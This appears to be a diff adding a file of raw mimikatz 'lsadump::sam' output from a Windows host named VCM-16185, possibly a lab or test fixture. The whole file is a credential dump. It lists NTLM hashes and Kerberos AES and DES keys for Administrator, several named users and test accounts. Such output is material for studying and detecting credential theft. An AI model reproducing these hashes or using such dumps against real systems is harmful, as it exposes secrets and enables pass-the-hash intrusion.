@@ -1,0 +1,196 @@
+
+mimikatz # lsadump::sam
+Domain : VCM-16185
+SysKey : d5c396003cd57c9c01343b548d1b4522
+Local SID : S-1-5-21-3752494878-3060419661-228393304
+
+SAMKey : 8166bb3ba924e51f82ea58e315cc8312
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 3ebae0f1e51c2b3cff2703555c5a0dc3
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 494d1f18eaabf5323410b9e7ff35bb74
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DESKTOP-657BO1KAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 7f93eae4663cffaa8ebac37ecea407d5b4c405aec7b95c3a3c343a853f8ac910
+      aes128_hmac       (4096) : 4237d12fef5a08747462f9c96dc7015f
+      des_cbc_md5       (4096) : 9e4ae9fd3e625b08
+    OldCredentials
+      aes256_hmac       (4096) : d990c703c9b14eaf952030045feca22c9eb7d5b413cde43f4eb978740cb09706
+      aes128_hmac       (4096) : 9be4a7fccff6cfa9bcc4217c309e0a9b
+      des_cbc_md5       (4096) : 9e4a3b5816cddaa4
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : DESKTOP-657BO1KAdministrator
+    Credentials
+      des_cbc_md5       : 9e4ae9fd3e625b08
+    OldCredentials
+      des_cbc_md5       : 9e4a3b5816cddaa4
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 67566694ec4c9a8921e3e0e1dc541337
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 8705f1bdae6ac74978db18b33f51967e
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : d24179a5965fb420a3c646e3147182311ecdbc0527977d9e330988d57a4cf60d
+      aes128_hmac       (4096) : 244dbcde708c4e4a1ece3ff969fa5577
+      des_cbc_md5       (4096) : 7fd3cbefda8334a8
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 7fd3cbefda8334a8
+
+
+RID  : 000003eb (1003)
+User : rapid
+  Hash NTLM: 6b6c8ff44e63542c7529fba1a012e0ca
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : f7c26e41ea1cd82c71573067acf2623d
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : VCM-16185rapid
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : f2b4173dfab976ea1690e26fdb65e656b93160d84c0dae0124f324fab6337c5c
+      aes128_hmac       (4096) : 27466de34d6e48865aa97d552e52a508
+      des_cbc_md5       (4096) : 8c15e90738e06719
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : VCM-16185rapid
+    Credentials
+      des_cbc_md5       : 8c15e90738e06719
+
+
+RID  : 000003ec (1004)
+User : vcm
+  Hash NTLM: 261684a48684b6b039c663068e663a97
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 5b40a7f5e459ddd438254d73ca79cbb5
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : VCM-16185vcm
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 4ec160b3bbdb2f461e41fc48b36fedc69c4e829049f22cab5931eedfc2b31924
+      aes128_hmac       (4096) : c5d446469522abf277da1156e20243c1
+      des_cbc_md5       (4096) : c7e94cbfbc85e645
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : VCM-16185vcm
+    Credentials
+      des_cbc_md5       : c7e94cbfbc85e645
+
+
+RID  : 000003ef (1007)
+User : test1
+  Hash NTLM: c51602d46e08e6fe02b5dc5c6439e538
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 98514465fa68c1ff2123638f4c4e8246
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : VCM-16185.WIN.DUKE.EDUtest1
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 64bf6ba93ee047d8f76ad1096508a65bec5130e67ddcbf96a00a38729773071b
+      aes128_hmac       (4096) : 66227df6082808476ef9f727e68c69ad
+      des_cbc_md5       (4096) : 19378a31251a80dc
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : VCM-16185.WIN.DUKE.EDUtest1
+    Credentials
+      des_cbc_md5       : 19378a31251a80dc
+
+
+RID  : 000003f0 (1008)
+User : test2
+  Hash NTLM: 0b3d9ec37bbee412e7195742fec7a43f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 018af301e182ed375aa217ffdb6f49c9
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : VCM-16185.WIN.DUKE.EDUtest2
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 379b550f363224ed3ef0e7fedf70715d9e938f31e81efbf7c9789279d30854ae
+      aes128_hmac       (4096) : a8185417ee7486702aca1a5a74655818
+      des_cbc_md5       (4096) : ad973d8c9dd09ef2
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : VCM-16185.WIN.DUKE.EDUtest2
+    Credentials
+      des_cbc_md5       : ad973d8c9dd09ef2
+
+
+RID  : 000003f1 (1009)
+User : test3
+  Hash NTLM: cb9549f723978e9fa4c76e42410119e2
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 263f319a3a88e8e6f3effd4bb790a667
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : VCM-16185.WIN.DUKE.EDUtest3
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 7855d18a95563ef88a36f0fd83e3f79d9dbfe9fe3447cfe87acaf500ee393989
+      aes128_hmac       (4096) : b3b60b2a52a6533c253955906c0e2a81
+      des_cbc_md5       (4096) : e326629d197579b3
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : VCM-16185.WIN.DUKE.EDUtest3
+    Credentials
+      des_cbc_md5       : e326629d197579b3
+
+
+mimikatz #
